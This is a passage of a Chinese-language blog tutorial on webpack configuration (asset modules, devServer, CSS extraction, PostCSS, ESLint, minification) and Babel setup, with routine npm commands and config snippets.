    loader: &quot;file-loader&quot;, 
    options: {
      outputPath: &quot;img&quot;,
      name: &quot;[hash:10].[ext]&quot; // &#x622A;&#x53D6;&#x7531;&#x5185;&#x5BB9;&#x751F;&#x6210;&#x7684; hash &#x957F;&#x5EA6; =&gt; &#x9ED8;&#x8BA4; 32 &#x4E2A; 16 &#x8FDB;&#x5236;
    }
  }
] 
</code></pre>
<p>v5 &#x524D;&#x52A0;&#x8F7D;&#x8D44;&#x6E90;&#x9700;&#x8981;&#x4F7F;&#x7528; raw-loader&#x3001;url-loader&#x3001;file-loader &#x7B49;&#xFF0C;v5 &#x540E;&#x53EF;&#x901A;&#x8FC7;&#x8D44;&#x6E90;&#x6A21;&#x5757;&#x7C7B;&#x578B; <a href="https://webpack.js.org/guides/asset-modules/#root">Asset Modules</a> &#x66FF;&#x4EE3;&#x4E0A;&#x8FF0; loader&#x3002;</p>
<p>asset/resource&#xFF1A;&#x5206;&#x53D1;&#x72EC;&#x7ACB;&#x6587;&#x4EF6;&#x5E76;&#x5BFC;&#x51FA; URL =&gt; &#x66FF;&#x4EE3; file-loader</p>
<p>asset/inline&#xFF1A;&#x5BFC;&#x51FA;&#x4E00;&#x4E2A;&#x8D44;&#x6E90;&#x7684; data URI =&gt; &#x66FF;&#x4EE3; url-loader</p>
<p>asset/source&#xFF1A;&#x5BFC;&#x51FA;&#x8D44;&#x6E90;&#x7684;&#x6E90;&#x4EE3;&#x7801; =&gt; &#x66FF;&#x4EE3; raw-loader</p>
<p>asset&#xFF1A;&#x81EA;&#x52A8;&#x9009;&#x62E9;&#x5BFC;&#x51FA; data URI &#x6216;&#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x5355;&#x72EC;&#x7684;&#x6587;&#x4EF6; =&gt; &#x66FF;&#x4EE3; url-loader</p>
<pre><code class="language-js">rules: [
  {
    test: /\.(png|jpe?g|gif|svg)$/i,
    type: &quot;asset&quot;,
    generator: {
      filename: &quot;img/[name]_[hash:6][ext]&quot;
    },
    parser: {
      dataUrlCondition: {
        maxSize: 10 * 1024
      }
    }
  }
]
</code></pre>
<p>&#x82E5;&#x9700;&#x8981;&#x5904;&#x7406;&#x7279;&#x6B8A;&#x5B57;&#x4F53; eot&#x3001;ttf&#x3001;woff... &#x8D44;&#x6E90;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; file-loader &#x6216; AM&#x3002;</p>
<pre><code class="language-js">rules: [
  {
    test: /\.(eot|ttf|woff2?)$/i,
    use: {
      loader: &quot;file-loader&quot;,
      options: {
        name: &quot;font/[name]_[hash:6].[ext]&quot; // &#x53EF;&#x901A;&#x8FC7; outputPath &#x4E0E; filename &#x66FF;&#x6362;
      }
    }
  }
]
</code></pre>
<pre><code class="language-js">rules: [
  {
    test: /\.(eot|ttf|woff2?)$/i,
    type: &quot;asset/resource&quot;,
    generator: {
      filename: &quot;font/[name]_[hash:6][ext]&quot; // &#x6B64;&#x5904;&#x4E3A; filename &#x4E2D;&#x5199;&#x76EE;&#x5F55;
    }
  }
]
</code></pre>
<ul>
<li>devserver</li>
</ul>
<p>&#x5F00;&#x53D1;&#x670D;&#x52A1;&#x5668; devServer &#x81EA;&#x52A8;&#x5316;&#x7F16;&#x8BD1;&#x3001;&#x6253;&#x5F00;&#x6D4F;&#x89C8;&#x5668;&#x3001;&#x5237;&#x65B0;&#x6D4F;&#x89C8;&#x5668;&#x3002;&#x53EA;&#x4F1A;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x7F16;&#x8BD1;&#x6253;&#x5305;&#xFF0C;&#x4E0D;&#x4F1A;&#x6709;&#x4EFB;&#x4F55;&#x8F93;&#x51FA;&#x3002;</p>
<pre><code class="language-shell"># &#x4E0B;&#x8F7D;&#x5305;
npm i webpack-dev-server
</code></pre>
<pre><code class="language-javascript">...
module.exports = { 
  ...,
  module: {
    rules: [ 
      ...
    ] 
  },
  plugins: [ 
    ... 
  ],
  mode: &apos;development&apos;,
  devServer: {
    contentBase: resolve(__dirname, &apos;build&apos;), // &#x9879;&#x76EE;&#x6784;&#x5EFA;&#x540E;&#x8DEF;&#x5F84;
    compress: true, // &#x542F;&#x52A8; gzip &#x538B;&#x7F29;
    port: 3000, // &#x7AEF;&#x53E3;&#x53F7; 
    open: true // &#x81EA;&#x52A8;&#x6253;&#x5F00;&#x6D4F;&#x89C8;&#x5668; 
  } 
};
</code></pre>
<pre><code class="language-shell">npx webpack-dev-server
</code></pre>
<p>&#x8FD9;&#x91CC;&#x9700;&#x8981;&#x6CE8;&#x610F;&#xFF0C;&#x5982;&#x679C;&#x4F7F;&#x7528;&#x7684;&#x662F; <strong>webpack-cli 4</strong>  &#x6216; <strong>webpack 5</strong>&#xFF0C;&#x66F4;&#x6539; <code>webpack-dev-server</code> &#x4E3A; <code>webpack serve</code> &#x3002;<a href="https://stackoverflow.com/questions/40379139/cannot-find-module-webpack-bin-config-yargs">stackoverflow&#x94FE;&#x63A5;</a>&#x3002;</p>
<ul>
<li>&#x5BF9;&#x4E8E; webpack-cli 3.x&#xFF1A;</li>
</ul>
<pre><code class="language-js">// package.json
&quot;scripts&quot;: { &quot;start:dev&quot;: &quot;webpack-dev-server&quot; }
</code></pre>
<ul>
<li>&#x5BF9;&#x4E8E; webpack-cli 4.x&#xFF1A;</li>
</ul>
<pre><code class="language-js">// package.json
&quot;scripts&quot;: { &quot;start:dev&quot;: &quot;webpack serve&quot; }
</code></pre>
<ul>
<li>&#x5F00;&#x53D1;&#x73AF;&#x5883;&#x914D;&#x7F6E;&#x5C0F;&#x7ED3;</li>
</ul>
<pre><code class="language-javascript">const { resolve } = require(&apos;path&apos;);
const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);
module.exports = { 
  entry: &apos;./src/js/index.js&apos;, 
  output: { 
    filename: &apos;js/built.js&apos;, 
    path: resolve(__dirname, &apos;build&apos;) 
  },
  module: { 
    rules: [ // loader &#x7684;&#x914D;&#x7F6E; 
      { // &#x5904;&#x7406; less &#x8D44;&#x6E90; 
        test: /\.less$/, use: [&apos;style-loader&apos;, &apos;css-loader&apos;, &apos;less-loader&apos;] 
      },{ // &#x5904;&#x7406; css &#x8D44;&#x6E90; 
        test: /\.css$/, use: [&apos;style-loader&apos;, &apos;css-loader&apos;] 
      },{ // &#x5904;&#x7406;&#x56FE;&#x7247;&#x8D44;&#x6E90; 
        test: /\.(jpg|png|gif)$/, 
        loader: &apos;url-loader&apos;, 
        options: { 
          limit: 8 * 1024, 
          name: &apos;[hash:10].[ext]&apos;, // &#x5173;&#x95ED; es6 &#x6A21;&#x5757;&#x5316; 
          esModule: false, 
          outputPath: &apos;imgs&apos; 
        } 
      },{ // &#x5904;&#x7406; html &#x4E2D; img &#x8D44;&#x6E90; 
        test: /\.html$/, 
        loader: &apos;html-loader&apos; 
      },{ // &#x5904;&#x7406;&#x5176;&#x4ED6;&#x8D44;&#x6E90; 
        exclude: /\.(html|js|css|less|jpg|png|gif)/, 
        loader: &apos;file-loader&apos;,
        options: {
          name: &apos;[hash:10].[ext]&apos;, 
          outputPath: &apos;media&apos; 
        } 
      } 
    ] 
  },plugins: [ // plugins &#x7684;&#x914D;&#x7F6E; 
    new HtmlWebpackPlugin({ template: &apos;./src/index.html&apos; }) 
  ],
  mode: &apos;development&apos;,
  devServer: { 
    contentBase: resolve(__dirname, &apos;build&apos;),
    compress: true, 
    port: 3000,
    open: true 
  } 
};
</code></pre>
<h3 id="prodenvconfiguration">prod-env configuration</h3>
<ul>
<li>Clean plugin for webpack</li>
</ul>
<p>&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x540E;&#x8FDB;&#x884C;&#x91CD;&#x65B0;&#x6253;&#x5305;&#x65F6;&#xFF0C;&#x901A;&#x5E38;&#x9700;&#x8981;&#x624B;&#x52A8;&#x5220;&#x9664; dist &#x76EE;&#x5F55;&#xFF0C;&#x6B64;&#x65F6;&#x53EF;&#x901A;&#x8FC7; Clean plugin for webpack &#x63D2;&#x4EF6;&#x5B8C;&#x6210;&#x3002;</p>
<pre><code class="language-shell">$ npm i clean-webpack-plugin -D
</code></pre>
<pre><code class="language-js">const { CleanWebpackPlugin } = require(&quot;clean-webpack-plugin&quot;); // &#x5F15;&#x5165;&#x7C7B;
plugins: [ new CleanWebpackPlugin() ]
</code></pre>
<p>plugin&#x8D2F;&#x7A7F;&#x6574;&#x4E2A; webpack &#x751F;&#x547D;&#x5468;&#x671F;</p>
<ul>
<li>&#x63D0;&#x53D6; css &#x6210;&#x5355;&#x72EC;&#x6587;&#x4EF6;</li>
</ul>
<p>&#x6837;&#x5F0F;&#x7ECF;&#x8FC7;&#x5904;&#x7406;&#x6574;&#x5408;&#x5728; <code>.js</code> &#x4E2D;&#xFF08;css-loader&#xFF09;&#x4F1A;&#x4F7F; <code>.js</code> &#x4F53;&#x79EF;&#x975E;&#x5E38;&#x5927;&#xFF0C;&#x4E0B;&#x8F7D;&#x901F;&#x5EA6;&#x6162;&#x3002;&#x540C;&#x65F6;&#x5FC5;&#x987B;&#x5148;&#x52A0;&#x8F7D;&#x624D;&#x80FD;&#x521B;&#x5EFA;&#x6807;&#x7B7E;&#x52A0;&#x8F7D;&#x5728;&#x9875;&#x9762;&#x4E2D;&#xFF0C;&#x8FD9;&#x91CC;&#x53C8;&#x4F1A;&#x51FA;&#x73B0;&#x95EA;&#x5C4F;&#x73B0;&#x8C61;&#x3002;&#x6545;&#x9700;&#x8981;&#x5C06; <code>.css</code> &#x6587;&#x4EF6;&#x4ECE; <code>.js</code> &#x6587;&#x4EF6;&#x63D0;&#x53D6;&#x51FA;&#x6765;&#x3002;&#x53C8;&#x8003;&#x8651;&#x4EE3;&#x7801;&#x4F53;&#x79EF;&#x8F83;&#x5927;&#xFF0C;&#x9700;&#x8981;&#x8FDB;&#x884C;&#x538B;&#x7F29;&#x5904;&#x7406;&#x3002;&#x90E8;&#x5206;&#x6837;&#x5F0F;&#x4EE3;&#x7801;&#x4E0E; <code>.js</code> &#x4EE3;&#x7801;&#x5B58;&#x5728;&#x517C;&#x5BB9;&#x95EE;&#x9898;&#xFF0C;&#x5982;&#x90E8;&#x5206; CSS3 &#x9700;&#x8981;&#x52A0;&#x4E0A;&#x524D;&#x7F00;&#x624D;&#x53EF;&#x4EE5;&#x5728;&#x4F4E;&#x7248;&#x672C;&#x8FDB;&#x884C;&#x8FD0;&#x884C;&#x3002;<a href="https://webpack.js.org/plugins/mini-css-extract-plugin/">&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;&#x70B9;&#x6B64;</a>&#x3002;</p>
<pre><code class="language-shell"># &#x4E0B;&#x8F7D;&#x63D2;&#x4EF6;
npm install --save-dev mini-css-extract-plugin
</code></pre>
<pre><code class="language-javascript">const { resolve } = require(&apos;path&apos;);
const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);
const MiniCssExtractPlugin = require(&apos;mini-css-extract-plugin&apos;);
module.exports = {
  entry: &apos;./src/js/index.js&apos;,
  output: {
    filename: &apos;js/built.js&apos;,
    path: resolve(__dirname, &apos;build&apos;)
  },
  module: {
    rules: [
      { 
        test: /\.css$/,
        use: [ 
          // &#x521B;&#x5EFA; style &#x6807;&#x7B7E;&#xFF0C;&#x5C06;&#x6837;&#x5F0F;&#x653E;&#x5165; 
          // &apos;style-loader&apos;, 
          // &#x8FD9;&#x4E2A; loader &#x53D6;&#x4EE3; style-loader&#x3002;&#x4F5C;&#x7528;&#xFF1A;&#x63D0;&#x53D6; js &#x4E2D;&#x7684; css &#x6210;&#x5355;&#x72EC;&#x6587;&#x4EF6; 
          MiniCssExtractPlugin.loader, // &#x4E0D;&#x9700;&#x8981;&#x5F15;&#x53F7;
          // &#x5C06; css &#x6587;&#x4EF6;&#x6574;&#x5408;&#x5230; js &#x6587;&#x4EF6;&#x4E2D; 
          &apos;css-loader&apos; 
        ] 
      } 
    ] 
  },
  plugins: [ 
    new HtmlWebpackPlugin({ 
      template: &apos;./src/index.html&apos; 
    }), 
    new MiniCssExtractPlugin({ 
      // &#x5BF9;&#x8F93;&#x51FA;&#x7684; css &#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x91CD;&#x547D;&#x540D; 
      filename: &apos;css/built.css&apos; 
    }) 
  ],
  mode: &apos;development&apos; 
};
</code></pre>
<ul>
<li>CSS &#x517C;&#x5BB9;&#x6027;&#x5904;&#x7406;</li>
</ul>
<p><code>user-select</code> &#x4E4B;&#x6D41;&#x7684;&#x6837;&#x5F0F;&#x662F;&#x9700;&#x8981;&#x8FDB;&#x884C;&#x517C;&#x5BB9;&#x5904;&#x7406;&#x7684;&#xFF0C;PostCSS &#x6B63;&#x662F;&#x5E38;&#x89C4;&#x7684;&#x8F6C;&#x6362;&#x4E0E;&#x9002;&#x914D;&#x5DE5;&#x5177;&#x3002;&#x5728;&#x5176;&#x901A;&#x8FC7; JS &#x8FDB;&#x884C;&#x8F6C;&#x6362;&#x7684;&#x540C;&#x65F6;&#xFF0C;&#x9700;&#x6839;&#x636E;&#x4E0D;&#x540C;&#x7684;&#x9700;&#x6C42;&#x6DFB;&#x52A0;&#x76F8;&#x5173;&#x7684;&#x63D2;&#x4EF6;&#x3002;</p>
<p>&#x7EC8;&#x7AEF;&#x4F7F;&#x7528; PostCSS &#x9700;&#x8981;&#x5DE5;&#x5177; postcss-cli&#xFF0C;&#x6837;&#x5F0F;&#x9700;&#x6DFB;&#x52A0;&#x524D;&#x7F00;&#x5E94;&#x5B89;&#x88C5; autoprefixer&#x3002;</p>
<pre><code class="language-shell">$ npm i postcss postcss-cli autoprefixer -D
</code></pre>
<pre><code class="language-shell"># &#x76F4;&#x63A5;&#x901A;&#x8FC7; postcss &#x5B9A;&#x5236;&#x4F7F;&#x7528; autoprefixer
$ npx postcss --use autoprefixer -o compatibleStyle.css ./src/css/originalStyle.css
</code></pre>
<pre><code class="language-javascript">use: [
  &quot;style-loader&quot;, &quot;css-loader&quot;,
  {
    loader: &quot;postcss-loader&quot;,
    options: {
      postcssOptions: {
        plugins: [
          require(&quot;autoprefixer&quot;)
        ]
      }
    }
  }
]
</code></pre>
<p>PostCSS &#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5185;&#x7F6E; autoprefixer &#x7684; postcss-preset-env&#xFF08;&#x63A8;&#x8350;&#xFF09;&#x3002;</p>
<blockquote>
<p>PostCSS Preset Env lets you convert modern CSS into something most browsers can understand, determining the polyfills need based on your targeted browsers or runtime environments.</p>
</blockquote>
<pre><code class="language-javascript">// postcss.config.js
module.exports = {
  plugins: [
    require(&quot;postcss-preset-env&quot;)
  ]
}
</code></pre>
<pre><code class="language-javascript">use: [ &quot;style-loader&quot;, &quot;css-loader&quot;, &quot;postcss-loader&quot; ]
</code></pre>
<ul>
<li><a href="https://github.com/browserslist/browserslist">browserlist repo</a></li>
</ul>
<pre><code class="language-javascript">// package.json
&quot;browserslist&quot;: { 
  &quot;development&quot;: [ 
    // &#x517C;&#x5BB9;&#x6700;&#x8FD1;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x7248;&#x672C;
    &quot;last 1 chrome version&quot;, 
    &quot;last 1 firefox version&quot;,
    &quot;last 1 safari version&quot; 
  ],
  &quot;production&quot;: [ 
    &quot;&gt;0.2%&quot;,
    &quot;not dead&quot;,
    &quot;not op_mini all&quot; 
  ]
}
</code></pre>
<ul>
<li>js &#x8BED;&#x6CD5;&#x68C0;&#x67E5;</li>
</ul>
<p>&#x89C4;&#x8303;&#x4EE3;&#x7801;&#x4E66;&#x5199;&#x98CE;&#x683C;&#x53EF;&#x4EE5;&#x5728;&#x68C0;&#x67E5;&#x5E38;&#x89C1;&#x8BED;&#x6CD5;&#x9519;&#x8BEF;&#x7684;&#x540C;&#x65F6;&#x589E;&#x5F3A;&#x5065;&#x58EE;&#x6027;&#x3002;&#x6700;&#x5E38;&#x4F7F;&#x7528;&#x7684;&#x662F;&#x57FA;&#x4E8E; eslint &#x5E93;&#x7684; eslint-loader&#x3002;&#x6CE8;&#x610F; eslint &#x4EC5;&#x68C0;&#x67E5;&#x5F00;&#x53D1;&#x8005;&#x4E66;&#x5199;&#x7684;&#x6E90;&#x4EE3;&#x7801;&#xFF0C;&#x4E0D;&#x68C0;&#x67E5;&#x7B2C;&#x4E09;&#x65B9;&#x7684;&#x5E93;&#x3002;&#x90E8;&#x5206;&#x9700;&#x8981;&#x5FFD;&#x7565;&#x68C0;&#x67E5;&#x7684;&#x4EE3;&#x7801;&#x524D;&#x53EF;&#x4EE5;&#x52A0;&#x4E0A; <code>eslint-disable-next-line</code>&#x3002;<a href="https://www.npmjs.com/package/eslint-config-airbnb-base">&#x8BE6;&#x7EC6;&#x79FB;&#x6B65;</a>&#x3002;</p>
<pre><code class="language-shell"># &#x4E0B;&#x8F7D;&#x5B89;&#x88C5;&#x5305;&#x4F7F;&#x7528; slint-config-airbnb-base &#x5E93;&#x8FDB;&#x884C;&#x8BED;&#x6CD5;&#x68C0;&#x67E5;
npm install --save-dev eslint-loader eslint eslint-config-airbnb-base eslint-plugin-import
</code></pre>
<pre><code class="language-javascript">// &#x914D;&#x7F6E; package.json
// &#x5B98;&#x65B9;&#x662F;&#x8BF4;&#x52A0;&#x5165; .eslintrc &#x6B64;&#x5904;&#x52A0;&#x5165; package.json &#x5373;&#x53EF;
&quot;eslintConfig&quot;: { &quot;extends&quot;: &quot;airbnb-base&quot;, &quot;env&quot;: { &quot;browser&quot;: true } }
</code></pre>
<pre><code class="language-javascript">const { resolve } = require(&apos;path&apos;);
const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);
const MiniCssExtractPlugin = require(&apos;mini-css-extract-plugin&apos;);
const OptimizeCssAssetsWebpackPlugin = require(&apos;optimize-css-assets-webpack-plugin&apos; )
// &#x8BBE;&#x7F6E; nodejs &#x73AF;&#x5883;&#x53D8;&#x91CF;
// process.env.NODE_ENV = &apos;development&apos;;
module.exports = { 
  entry: &apos;./src/js/index.js&apos;,
  output: {
    filename: &apos;js/built.js&apos;,
    path: resolve(__dirname, &apos;build&apos;) 
  },
  module: { 
    rules: [ 
      /*
      &#x8BED;&#x6CD5;&#x68C0;&#x67E5;&#xFF1A; eslint-loader eslint 
      &#x6CE8;&#x610F;&#xFF1A;&#x53EA;&#x68C0;&#x67E5;&#x81EA;&#x5DF1;&#x5199;&#x7684;&#x6E90;&#x4EE3;&#x7801;&#xFF0C;&#x7B2C;&#x4E09;&#x65B9;&#x7684;&#x5E93;&#x662F;&#x4E0D;&#x7528;&#x68C0;&#x67E5;&#x7684; 
      &#x8BBE;&#x7F6E;&#x68C0;&#x67E5;&#x89C4;&#x5219;: package.json &#x4E2D; eslintConfig &#x4E2D;&#x8BBE;&#x7F6E;~ 
      &quot;eslintConfig&quot;: {
      &quot;extends&quot;: &quot;airbnb-base&quot; 
      } 
      airbnb &#x9700;&#x8981; eslint-config-airbnb-base eslint-plugin-import eslint &#x4E09;&#x4E2A;&#x5E93;
      */
      { 
        test: /\.js$/,
        exclude: /node_modules/,  // &#x4E00;&#x5B9A;&#x8981;&#x6CE8;&#x610F;, &#x5426;&#x5219;&#x4F1A;&#x5BF9; node_modules &#x8FDB;&#x884C;&#x68C0;&#x67E5;
        loader: &apos;eslint-loader&apos;, 
        options: { 
          // &#x81EA;&#x52A8;&#x4FEE;&#x590D; eslint &#x7684;&#x9519;&#x8BEF; 
          fix: true 
        } 
      } 
    ] 
  },
  plugins: [ 
    new HtmlWebpackPlugin({ template: &apos;./src/index.html&apos; }), 
    new MiniCssExtractPlugin({ filename: &apos;css/built.css&apos; }),
    // &#x538B;&#x7F29; css 
    new OptimizeCssAssetsWebpackPlugin() ],
  mode: &apos;development&apos;
};
</code></pre>
<ul>
<li>js &#x538B;&#x7F29;&#x4E0E; html &#x538B;&#x7F29;</li>
</ul>
<p>&#x751F;&#x4EA7;&#x73AF;&#x5883;&#x4F1A;&#x81EA;&#x52A8;&#x538B;&#x7F29; <code>.js</code> &#x4EE3;&#x7801;&#x3002;</p>
<pre><code class="language-javascript">const { resolve } = require(&apos;path&apos;);
const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);
module.exports = {
  entry: &apos;./src/js/index.js&apos;,
  output: {
    filename: &apos;js/built.js&apos;,
    path: resolve(__dirname, &apos;build&apos;) 
  },
  plugins: [ new HtmlWebpackPlugin({ template: &apos;./src/index.html&apos; }) ],
  // &#x751F;&#x4EA7;&#x73AF;&#x5883;&#x4E0B;&#x4F1A;&#x81EA;&#x52A8;&#x538B;&#x7F29; js &#x4EE3;&#x7801; 
  mode: &apos;production&apos; 
};
</code></pre>
<pre><code class="language-javascript">const { resolve } = require(&apos;path&apos;);
const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);
module.exports = {
  entry: &apos;./src/js/index.js&apos;,
  output: {
    filename: &apos;js/built.js&apos;,
    path: resolve(__dirname, &apos;build&apos;) },
  plugins: [
    new HtmlWebpackPlugin({
      template: &apos;./src/index.html&apos;, 
      // &#x538B;&#x7F29; html &#x4EE3;&#x7801; 
      minify: { // &#x79FB;&#x9664;&#x7A7A;&#x683C; 
        collapseWhitespace: true, 
        // &#x79FB;&#x9664;&#x6CE8;&#x91CA;
        removeComments: true } }) 
  ],
  mode: &apos;production&apos; 
};
</code></pre>
<ul>
<li>&#x751F;&#x4EA7;&#x73AF;&#x5883;&#x914D;&#x7F6E;&#x6C47;&#x603B;</li>
</ul>
<pre><code class="language-javascript">const { resolve } = require(&apos;path&apos;);
const MiniCssExtractPlugin = require(&apos;mini-css-extract-plugin&apos;);
const OptimizeCssAssetsWebpackPlugin = require(&apos;optimize-css-assets-webpack-plugin&apos; );
const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);
// &#x5B9A;&#x4E49; nodejs &#x73AF;&#x5883;&#x53D8;&#x91CF;: &#x51B3;&#x5B9A;&#x4F7F;&#x7528; browserslist &#x7684;&#x54EA;&#x4E2A;&#x73AF;&#x5883; 
process.env.NODE_ENV = &apos;production&apos;;
// &#x590D;&#x7528; loader 
const commonCssLoader = [
  MiniCssExtractPlugin.loader,
  &apos;css-loader&apos;,
  { 
    // &#x8FD8;&#x9700;&#x8981;&#x5728; package.json &#x4E2D;&#x5B9A;&#x4E49; browserslist
    loader: &apos;postcss-loader&apos;,
    options: {
      ident: &apos;postcss&apos;, 
      plugins: () =&gt; [require(&apos;postcss-preset-env&apos;)()] 
    } 
  } 
];
module.exports = {
  entry: &apos;./src/js/index.js&apos;,
  output: { filename: &apos;js/built.js&apos;, path: resolve(__dirname, &apos;build&apos;) },
  module: { 
    rules: [
      { test: /\.css$/, use: [...commonCssLoader] },
      { test: /\.less$/, use: [...commonCssLoader, &apos;less-loader&apos;] },
      /* &#x6B63;&#x5E38;&#x6765;&#x8BB2;, &#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x53EA;&#x80FD;&#x88AB;&#x4E00;&#x4E2A; loader &#x5904;&#x7406;. &#x5F53;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x8981;&#x88AB;&#x591A;&#x4E2A; loader &#x5904;&#x7406;, &#x90A3;&#x4E48;&#x4E00;&#x5B9A;&#x8981;&#x6307;&#x5B9A; loader &#x6267;&#x884C;&#x7684;&#x5148;&#x540E;&#x987A;&#x5E8F;: &#x5148;&#x6267;&#x884C; eslint &#x518D;&#x6267;&#x884C; babel (&#x5148;&#x6267;&#x884C; babel-loader&#x518D;&#x6267;&#x884C; eslint &#x5C31;&#x4F1A;&#x62A5;&#x9519;) */
      { // &#x5728; package.json &#x4E2D; eslintConfig --&gt; airbnb 
        test: /\.js$/,
        exclude: /node_modules/,
        // &#x4F18;&#x5148;&#x6267;&#x884C; &#x4E0D;&#x8BBA;&#x653E;&#x5728;&#x54EA;&#x91CC;&#x7684;&#x4F4D;&#x7F6E;!!!
        enforce: &apos;pre&apos;, 
        loader: &apos;eslint-loader&apos;,
        options: { fix: true }
      },
      {
        test: /\.js$/, // &#x9700;&#x8981;&#x68C0;&#x67E5;&#x7684; js &#x6587;&#x4EF6;
        exclude: /node_modules/,
        loader: &apos;babel-loader&apos;,
        options: {
          presets: [
            [
              &apos;@babel/preset-env&apos;,
              // @babel/preset-env - @babel/polifill(&#x592A;&#x5927;) - core-js
              { // &#x6309;&#x9700;&#x52A0;&#x8F7D; core-js
                useBuiltIns: &apos;usage&apos;, corejs: {version: 3}, // corejs &#x7248;&#x672C;
                targets: { chrome:&apos;60&apos;, firefox: &apos;50&apos; } // &#x6307;&#x5B9A;&#x505A;&#x5230;&#x6D4F;&#x89C8;&#x5668;&#x7248;&#x672C;
              }
            ]
          ]
        }
      },
      { 
        test: /\.(jpg|png|gif)/,
        loader: &apos;url-loader&apos;,
        // &#x8BB0;&#x4F4F;&#x5173;&#x95ED; es6
        options: { limit: 8 * 1024, name: &apos;[hash:10].[ext]&apos;, outputPath: &apos;imgs&apos;, esModule: false }
      },
      // &#x4E13;&#x95E8;&#x5904;&#x7406; html &#x4E2D;&#x56FE;&#x7247;&#x95EE;&#x9898;
      { test: /\.html$/, loader: &apos;html-loader&apos; }, // &#x4F7F;&#x7528;&#x7684;&#x662F; commonjs &#x800C; url-loader &#x4F7F;&#x7528;&#x7684;&#x662F; es6
      { 
        exclude: /\.(js|css|less|html|jpg|png|gif)/,
        loader: &apos;file-loader&apos;,
        options: { outputPath: &apos;media&apos; }
      }
    ]
  },
  plugins:[ 
    new MiniCssExtractPlugin({ filename: &apos;css/built.css&apos; }),
    new OptimizeCssAssetsWebpackPlugin(),
    new HtmlWebpackPlugin({ 
      template: &apos;./src/index.html&apos;,
      // html &#x6587;&#x4EF6;&#x901A;&#x8FC7; minify &#x5C5E;&#x6027;&#x8FDB;&#x884C;&#x538B;&#x7F29;
      // &#x538B;&#x7F29;&#x7A7A;&#x683C;&#x3001;&#x6E05;&#x9664;&#x6CE8;&#x91CA;
      minify: { collapseWhitespace: true, removeComments: true}
    })
  ],
  mode: &apos;production&apos; 
};
</code></pre>
<pre><code class="language-javascript">&quot;browserlist&quot;: {
  &quot;development&quot;: [
    &quot;last 1 chrome version&quot;,
    &quot;last 1 firefox version&quot;,
    &quot;last 1 safari version&quot;
  ],
  &quot;production&quot;: [
    &quot;&gt;0.2%&quot;,
    &quot;not dead&quot;,
    &quot;not op_mini all&quot;
  ]
}
&quot;eslintConfig&quot;: {
  &quot;extends&quot;: &quot;airbnb-base&quot;
}
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="babel">Babel</h2>
<p><a href="https://babeljs.io/docs/en/">&#x5DF4;&#x522B;&#x5854; Babel</a> &#x662F;&#x4E00;&#x4E2A;&#x5DE5;&#x5177;&#x94FE;&#xFF0C;&#x4E3B;&#x8981;&#x7528;&#x4E8E;&#x5C06; ECMAScript 2015+ &#x4EE3;&#x7801;&#x8F6C;&#x6362;&#x4E3A;&#x5F53;&#x524D;&#x548C;&#x65E7;&#x7248;&#x6D4F;&#x89C8;&#x5668;&#x6216;&#x73AF;&#x5883;&#x4E2D;&#x5411;&#x540E;&#x517C;&#x5BB9;&#x7684; JavaScript &#x7248;&#x672C;&#x3002;Babel &#x5728;&#x8F6C;&#x8BD1;&#x65F6;&#xFF0C;&#x4F1A;&#x5C06;&#x6E90;&#x4EE3;&#x7801;&#x5206;&#x6210; syntax &#x548C; api &#x4E24;&#x90E8;&#x5206;&#x6765;&#x5904;&#x7406;&#x3002;let&#x3001;const &#x7B49;&#x89C6;&#x4F5C; syntax&#xFF1B;&#x51FD;&#x6570;&#x3001;&#x65B9;&#x6CD5;&#x89C6;&#x4F5C; API&#x3002;</p>
<h3 id="configurations">Configurations</h3>
<ul>
<li>@babel/core =&gt; babel &#x7684;&#x6838;&#x5FC3;&#x5E93;&#xFF0C;&#x63D0;&#x4F9B; API &#x4F9B; babel-loader &#x8C03;&#x7528;</li>
</ul>
<pre><code class="language-shell">$ npm install --save-dev @babel/core
</code></pre>
<ul>
<li><a href="https://babeljs.io/docs/en/babel-preset-env">@babel/preset-env</a> =&gt; &#x9884;&#x8BBE;&#x63D2;&#x4EF6;&#x96C6;&#x5408;&#xFF0C;&#x6839;&#x636E;&#x6307;&#x5B9A;&#x7684;&#x6267;&#x884C;&#x73AF;&#x5883;&#x63D0;&#x4F9B;&#x8BED;&#x6CD5;&#x7FFB;&#x8BD1;</li>
</ul>
<p>&#x5728;&#x6CA1;&#x6709;&#x9884;&#x8BBE;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x8981;&#x8F6C;&#x6362;&#x7BAD;&#x5934;&#x51FD;&#x6570;&#x548C;&#x5757;&#x7EA7;&#x4F5C;&#x7528;&#x57DF;&#xFF0C;&#x5C31;&#x5FC5;&#x987B;&#x8FDB;&#x884C;&#x63D2;&#x4EF6;&#x7684;&#x4E0B;&#x8F7D;&#x3002;</p>
<pre><code class="language-shell">$ npm i @babel/plugin-transform-arrow-functions @babel/plugin-block-scoping -D
</code></pre>
<pre><code class="language-shell">$ npx babel src --out-dir dist --plugins=@babel/plugin-transform-arrow-functions,@babel/plugin-block-scoping
</code></pre>
<p>&#x65B0;&#x8BED;&#x6CD5;&#x4F1A;&#x5BF9;&#x5E94;&#x7E41;&#x6742;&#x7684;&#x63D2;&#x4EF6;&#xFF0C;&#x6545; Babel &#x63D0;&#x4F9B;&#x5E94;&#x5BF9;&#x5404;&#x79CD;&#x60C5;&#x51B5;&#x7684;&#x9884;&#x8BBE;&#x8FDB;&#x884C;&#x7B80;&#x5316;&#x3002;</p>
<pre><code class="language-shell">$ npm install --save-dev @babel/preset-env
</code></pre>
<pre><code class="language-shell">$ npx babel src --out-dir dist --presets=@babel/preset-env
</code></pre>
